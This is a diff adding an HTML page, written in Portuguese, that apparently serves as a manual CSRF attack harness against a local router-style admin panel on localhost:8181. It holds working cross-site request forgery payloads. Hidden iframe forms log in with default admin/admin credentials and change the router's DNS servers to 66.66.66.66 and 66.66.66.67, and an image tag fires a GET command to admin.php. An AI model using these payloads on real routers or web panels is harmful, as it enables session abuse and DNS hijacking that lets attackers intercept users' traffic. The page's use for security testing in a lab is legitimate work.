@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Teste de Ataque CSRF</title>
+</head>
+<body>
+    <h1>Teste de Ataque CSRF Manual</h1>
+
+    <div>
+        <h2>1. Teste de Login Automático</h2>
+        <button onclick="testLogin()">Testar Login</button>
+        <div id="loginResult"></div>
+    </div>
+
+    <div style="margin-top: 20px;">
+        <h2>2. Teste de Alteração DNS</h2>
+        <button onclick="testDNSChange()">Alterar DNS</button>
+        <div id="dnsResult"></div>
+    </div>
+
+    <div style="margin-top: 20px;">
+        <h2>3. Teste de Comando GET</h2>
+        <button onclick="testCommand()">Executar Comando</button>
+        <div id="cmdResult"></div>
+    </div>
+
+    <script>
+        function testLogin() {
+            console.log('Testando login...');
+
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:8181/index.php';
+            form.target = 'login_test_frame';
+
+            form.innerHTML = `
+                <input type="text" name="username" value="admin">
+                <input type="password" name="password" value="admin">
+            `;
+
+            const iframe = document.createElement('iframe');
+            iframe.name = 'login_test_frame';
+            iframe.style.display = 'none';
+
+            document.body.appendChild(iframe);
+            document.body.appendChild(form);
+
+            form.submit();
+
+            document.getElementById('loginResult').innerHTML = 'Login enviado! Verifique se foi redirecionado para admin.php';
+
+            setTimeout(() => {
+                document.body.removeChild(form);
+                document.body.removeChild(iframe);
+            }, 2000);
+        }
+
+        function testDNSChange() {
+            console.log('Testando alteração DNS...');
+
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://localhost:8181/admin.php';
+            form.target = 'dns_test_frame';
+
+            form.innerHTML = `
+                <input type="text" name="primary_dns" value="66.66.66.66">
+                <input type="text" name="secondary_dns" value="66.66.66.67">
+            `;
+
+            const iframe = document.createElement('iframe');
+            iframe.name = 'dns_test_frame';
+            iframe.style.display = 'none';
+            iframe.style.width = '100%';
+            iframe.style.height = '200px';
+
+            // Tornar iframe visível para debug
+            iframe.style.display = 'block';
+            iframe.style.border = '1px solid #ccc';
+
+            document.body.appendChild(iframe);
+            document.body.appendChild(form);
+
+            form.submit();
+
+            document.getElementById('dnsResult').innerHTML = 'DNS alterado! Verifique na aba do roteador';
+
+            setTimeout(() => {
+                document.body.removeChild(form);
+                // Manter iframe para ver resultado
+            }, 2000);
+        }
+
+        function testCommand() {
+            console.log('Testando comando...');
+
+            const img = document.createElement('img');
+            img.src = 'http://localhost:8181/admin.php?cmd=test_attack';
+            img.style.display = 'none';
+            img.onerror = () => {
+                document.getElementById('cmdResult').innerHTML = 'Comando enviado via GET (erro esperado devido CORS)';
+            };
+            img.onload = () => {
+                document.getElementById('cmdResult').innerHTML = 'Comando executado com sucesso!';
+            };
+
+            document.body.appendChild(img);
+        }
+    </script>
+</body>
+</html>
